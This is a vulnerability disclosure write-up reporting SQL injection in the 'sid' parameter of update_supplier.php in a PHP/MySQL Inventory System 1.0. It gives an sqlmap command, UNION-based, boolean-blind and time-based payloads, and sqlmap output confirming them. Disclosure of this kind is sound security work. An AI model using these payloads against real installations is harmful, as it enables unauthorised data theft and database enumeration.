# SQL Injection in Inventory System (Update Supplier)

## Overview

* **Vulnerability Type**: SQL Injection (UNION-based / Blind)
* **Product**: [Inventory System](https://www.sourcecodester.com/php/7760/inventory-system-php-and-mysql.html)
* **Version**: 1.0
* **Component**: Update Supplier (`update_supplier.php`)
* **Vulnerable Parameter**: `sid` (GET)

## Description

A SQL Injection vulnerability exists in the **Inventory System**. The vulnerability is located in the `update_supplier.php` file.

The application fails to properly sanitize the `sid` parameter in the HTTP GET request. This allows an authenticated attacker to inject arbitrary SQL commands. Since the backend database is **MySQL** and the injection point allows for **UNION queries** (6 columns), attackers can directly retrieve and display sensitive data from the database, in addition to using blind injection techniques.

## Steps to Reproduce

1. **Setup**: Deploy the Inventory System locally.
2. **Login**: Log in to the application.
3. **Exploit**: Send a crafted HTTP GET request to `update_supplier.php` injecting SQL into the `sid` parameter, or use `sqlmap`.

**SQLMap Command:**

```bash
sqlmap -u "http://127.0.0.1:8089/update_supplier.php?sid=38&table=supplier_details&return=view_supplier.php" \
--batch -v 6 --risk=3 \
--cookie "PHPSESSID=YOUR_COOKIE_HERE"

```

## PoC Payload

**UNION Query Payload (MySQL):**

```sql
sid=-6484 UNION ALL SELECT NULL,CONCAT(0x717a717171,0x5459646b615046544565497867624379676257424e53647274596e476d74614b434d4351534c4f6c,0x7171766b71),NULL,NULL,NULL,NULL-- -&table=supplier_details&return=view_supplier.php

```

**Boolean-based Blind Payload:**

```sql
sid=(SELECT (CASE WHEN (4549=4549) THEN 38 ELSE (SELECT 9874 UNION SELECT 9029) END))&table=supplier_details&return=view_supplier.php

```

**Time-based Blind Payload:**

```sql
sid=38 AND (SELECT 1973 FROM (SELECT(SLEEP(5)))iUpD)&table=supplier_details&return=view_supplier.php

```

## Proof of Concept

The following output from `sqlmap` confirms that the `sid` parameter is vulnerable to UNION-based, Boolean-based, and Time-based SQL injection.

```text
Parameter: sid (GET)
    Type: boolean-based blind
    Title: Boolean-based blind - Parameter replace (original value)
    Payload: sid=(SELECT (CASE WHEN (4549=4549) THEN 38 ELSE (SELECT 9874 UNION SELECT 9029) END))&table=supplier_details&return=view_supplier.php
    Vector: (SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END))

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: sid=38 AND (SELECT 1973 FROM (SELECT(SLEEP(5)))iUpD)&table=supplier_details&return=view_supplier.php
    Vector: AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])

    Type: UNION query
    Title: Generic UNION query (NULL) - 6 columns
    Payload: sid=-6484 UNION ALL SELECT NULL,CONCAT(0x717a717171,0x5459646b615046544565497867624379676257424e53647274596e476d74614b434d4351534c4f6c,0x7171766b71),NULL,NULL,NULL,NULL-- -&table=supplier_details&return=view_supplier.php
    Vector:  UNION ALL SELECT NULL,[QUERY],NULL,NULL,NULL,NULL-- -
---
[INFO] the back-end DBMS is MySQL

```
<img width="1060" height="370" alt="图片" src="https://github.com/user-attachments/assets/8fa7c6c7-f2d5-4fc6-b555-99e40e62d1c5" />


## Impact

This vulnerability allows an attacker to:

1. **Exfiltrate Data**: Directly retrieve and display database content via UNION-based attacks.
2. **Database Enumeration**: Identify tables, columns, and database schema.

## Reference

* [Project Source Code](https://www.sourcecodester.com/php/7760/inventory-system-php-and-mysql.html)
